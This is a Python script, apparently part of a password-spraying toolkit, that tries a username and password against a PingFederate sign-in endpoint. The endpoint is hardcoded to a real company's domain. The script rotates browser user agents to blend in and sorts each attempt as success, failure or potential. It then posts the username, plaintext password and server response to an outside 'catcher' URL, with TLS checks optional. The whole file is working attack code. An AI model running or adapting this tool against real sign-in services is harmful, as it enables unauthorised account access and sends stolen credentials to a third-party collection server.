import requests
import random
import os
from urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
import uuid

required_env_vars = {"USERNAME", "PASSWORD", "CATCHERURL", "CATCHERTLS"}
env_vars = {var: os.getenv(var) for var in required_env_vars}

missing_env_vars = [var for var, value in env_vars.items() if value is None]
if missing_env_vars:
    missing_vars_str = ", ".join(missing_env_vars)
    raise ValueError(f"Missing environment variables: {missing_vars_str}")

username = env_vars["USERNAME"]
password = env_vars["PASSWORD"]
catcher_URL = env_vars["CATCHERURL"]
catcher_uses_TLS = env_vars["CATCHERTLS"].lower() == "true"

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
]
user_agent = random.choice(user_agents)

def pingfed_authenticate(url, username, password):

    data_response = {
        'result': None,    # Can be "success", "failure" or "potential"
        'error': False,
        'output': "",
        'valid_user': False
    }

    post_data = {
        'pf.username': username,
        'pf.pass': password,
        'pf.ok': 'clicked',
        'pf.cancel': '',
        'pf.adapterId': 'PingOneHTMLFormAdapter'
    }

    params_data = {
        'client-request-id': '',
        'wa': 'wsignin1.0',
        'wtrealm': 'urn:federation:MicrosoftOnline',
        'wctx': '',
        'cbcxt': '',
        'username': username,
        'mkt': '',
        'lc': '',
        'pullStatus': 0
    }

    headers = {
        'User-Agent': user_agent,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, image/webp,*/*;q=0.8'
    }

    try:
        full_url = f"{url}/idp/prp.wsf"

        # Get cookie and form action URL. Update with each request to avoid "page expired" responses.
        sess = requests.session()
        resp = sess.get(full_url, headers=headers, params=params_data)
        page = BeautifulSoup(resp.text, features="html.parser")
        action = page.find('form').get('action')

        # Auth attempt
        resp = sess.post(f"{url}{action}", headers=headers, params=params_data, data=post_data, allow_redirects=False)
        page = BeautifulSoup(resp.text, features="html.parser")

        # Handle the authentication result
        if "success" in page.text:
            data_response['result'] = "success"
            data_response['valid_user'] = True
        elif "invalid" in page.text:
            data_response['result'] = "failure"
        else:
            data_response['result'] = "potential"

        data_response['output'] = page.text
        return data_response

    except requests.exceptions.Timeout:
        data_response['error'] = True
        data_response['output'] = "Timeout occurred"
        return data_response
    except requests.exceptions.ConnectionError:
        data_response['error'] = True
        data_response['output'] = "Connection error"
        return data_response
    except requests.RequestException as e:
        data_response['error'] = True
        data_response['output'] = f"Unhandled exception: {str(e)}"
        return data_response

def send_data_to_catcher(data, use_ssl):
    if not use_ssl:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    try:
        response = requests.post(catcher_URL, json=data, timeout=3, verify=use_ssl)
        print(f"[+] Data sent to the catcher. Status Code: {response.status_code}")
    except requests.RequestException:
        print(f"[-] Failed to send data to the catcher.")

# Perform PingFederate authentication
pingfed_url = "https://pi.zebra.com/"  # Replace with your PingFederate URL
auth_response = pingfed_authenticate(pingfed_url, username, password)

data = {
    "username": username,
    "password": password,
}

if auth_response['error']:
    data["status_code"] = 500
    data["response"] = auth_response['output']
else:
    data["status_code"] = 200
    data["response"] = auth_response['output']

send_data_to_catcher(data, use_ssl=catcher_uses_TLS)
